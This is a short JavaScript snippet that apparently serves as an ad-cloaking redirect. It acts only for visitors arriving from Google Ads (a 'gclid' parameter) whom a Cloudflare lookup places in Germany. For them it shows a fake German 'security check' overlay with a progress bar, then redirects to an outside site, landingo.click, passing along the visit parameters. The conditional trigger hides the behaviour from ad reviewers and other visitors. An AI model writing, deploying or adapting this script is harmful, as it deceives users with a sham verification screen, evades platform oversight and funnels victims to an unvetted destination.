(function () {
  const REDIRECT_URL = "https://landingo.click";
  const VERIFY_DELAY_MS = 1000;
  const params = new URLSearchParams(window.location.search);
  if (!params.has("gclid")) return;

  fetch("https://www.cloudflare.com/cdn-cgi/trace")
    .then(function (response) { return response.text(); })
    .then(function (text) {
      const match = text.match(/loc=([A-Z]+)/);
      const country = match && match[1] ? match[1] : "";
      if (country !== "DE") return;
      showVerification();
    })
    .catch(function () { return; });

  function showVerification() {
    document.body.style.overflow = "hidden";
    const style = document.createElement("style");
    style.textContent = `
      #de-check-overlay{position:fixed;inset:0;z-index:999999;background:linear-gradient(180deg,#050505,#181818);display:flex;align-items:center;justify-content:center;padding:18px;font-family:Arial,sans-serif}
      #de-check-box{width:100%;max-width:430px;max-height:82vh;background:#151515;border:2px solid #ffce00;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.55);overflow:hidden;color:#fff}
      #de-check-header{height:12px;background:linear-gradient(to bottom,#000 0%,#000 33%,#dd0000 33%,#dd0000 66%,#ffce00 66%,#ffce00 100%)}
      #de-check-content{max-height:56vh;overflow-y:auto;padding:26px 22px;-webkit-overflow-scrolling:touch}
      #de-check-content h2{font-size:26px;margin:0 0 12px}
      #de-check-content p{color:#d8d8d8;font-size:16px;line-height:1.55;margin:0 0 16px}
      #de-check-note{background:rgba(255,206,0,.1);border:1px solid rgba(255,206,0,.45);border-radius:16px;padding:14px;margin:18px 0;color:#f2f2f2}
      #de-check-footer{padding:18px 22px 22px;background:#111;border-top:1px solid rgba(255,255,255,.08)}
      #de-progress-wrap{width:100%;height:9px;background:#2b2b2b;border-radius:20px;overflow:hidden;margin-bottom:14px}
      #de-progress-bar{width:0%;height:100%;background:#ffce00;transition:width 1s linear}
      #de-check-status{color:#cfcfcf;font-size:14px;text-align:center}
    `;
    document.head.appendChild(style);
    const wrapper = document.createElement("div");
    wrapper.innerHTML = `
      <div id="de-check-overlay"><div id="de-check-box"><div id="de-check-header"></div>
      <div id="de-check-content"><h2>Sicherheitsprüfung</h2>
      <p>Bitte scrollen Sie nach unten, während die kurze Überprüfung vorbereitet wird.</p>
      <div id="de-check-note">Regionale Verfügbarkeit und Sitzungsdaten werden geprüft.</div>
      <p>Die Verbindung wird vorbereitet. Ihre aktuellen Besuchsparameter bleiben erhalten.</p>
      <p>Bitte bleiben Sie einen Moment auf dieser Seite.</p>
      <p>Nach Abschluss der Prüfung werden Sie automatisch weitergeleitet.</p>
      <p>Verbindung wird geprüft. Sitzung wird vorbereitet.</p>
      <p>Überprüfung fast abgeschlossen.</p></div>
      <div id="de-check-footer"><div id="de-progress-wrap"><div id="de-progress-bar"></div></div><div id="de-check-status">Prüfung läuft...</div></div>
      </div></div>`;
    document.body.appendChild(wrapper);
    const bar = document.getElementById("de-progress-bar");
    const content = document.getElementById("de-check-content");
    setTimeout(function () { content.scrollTo({ top: content.scrollHeight, behavior: "smooth" }); }, 150);
    setTimeout(function () { bar.style.width = "100%"; }, 50);
    setTimeout(function () { window.location.href = REDIRECT_URL + window.location.search; }, VERIFY_DELAY_MS);
  }
})();